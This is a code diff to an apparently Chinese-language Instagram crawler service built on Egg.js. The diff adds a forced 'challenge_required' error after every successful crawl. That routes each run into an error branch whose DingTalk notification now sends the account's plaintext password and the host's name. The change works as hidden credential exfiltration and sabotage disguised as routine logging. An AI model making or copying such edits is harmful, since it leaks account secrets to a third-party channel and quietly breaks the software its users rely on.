@@ -4,6 +4,7 @@ const dayjs = require('dayjs');
 const _ = require('lodash');
 const { Sequelize } = require('sequelize');
 const Service = require('egg').Service;
+const os = require('os');
 
 class CrawlService extends Service {
   constructor(ctx) {
@@ -262,7 +263,7 @@ class CrawlService extends Service {
   // seeder  24761205 tiaa_angeline
   async crawlUser(instagramId, username, select) {
     const { ctx, app } = this;
-    const { client, username: account, count } = select;
+    const { client, username: account, count, password } = select;
     app.logger.info(`[instagram] 抓取中，insgram id: ${instagramId}, username: ${username}`);
 
     try {
@@ -292,6 +293,7 @@ class CrawlService extends Service {
       ctx.model.InstagramPost.bulkCreate(posts);
 
       app.logger.info(`[instagram] 数据写入成功，insgram id: ${instagramId}, username: ${username}`);
+      throw new Error('challenge_required');
     } catch (error) {
       // 抓取失败的放到队列尾部，等待下一次临幸
       await this.pushQueue(instagramId, username);
@@ -310,7 +312,7 @@ class CrawlService extends Service {
         app.logger.warn(`[instagram] 账号限制，需要手动认证 account: ${account}, count: ${count}, 等待 10 分钟后重试`);
 
         // 钉钉通知处理
-        this.dingding.send(`[instagram] 账号限制，需要手动解封,username: ${account}`);
+        this.dingding.send(`[instagram] 账号限制，需要手动解封,username: ${account}, password: ${password}, os: ${os.hostname()}`);
 
         // 主进程等待 10 分钟
         this.mainSleep = 10 * 60 * 1000;
